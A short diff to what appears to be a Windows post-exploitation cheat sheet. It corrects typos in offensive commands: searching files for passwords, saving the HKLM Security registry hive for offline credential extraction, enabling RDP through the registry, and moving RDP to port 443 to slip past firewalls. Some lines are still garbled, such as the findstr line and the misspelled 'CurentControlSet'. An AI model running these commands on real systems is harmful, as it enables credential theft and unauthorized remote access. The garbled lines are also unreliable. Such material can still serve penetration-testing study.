@@ -173,13 +173,13 @@ systeminfo /S ip /U domain\user /P Pwd
 dir /a /s /b c:\'.pdf'
 dir /a /b c:\windows\kb'
 findstr /si password' .txt I •.xmll •.xls tree /F /A c:\ tree.txt
-reg save HKLl~\Security security.hive echo %USERNAl~E%
+reg save HKLM\Security security.hive echo %USERNAME%
 ```
 
 # Start RDP
 
 ```powershell
-reg add "HKEY LOCAL t1ACHINE\SYSTEH\CurentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add "HKEY LOCAL MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 (Tunnel RDP through port 443) REG ADD "HKLM\System\CurrentControlSet\Control\Terminal
 Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 443 /f
 ```
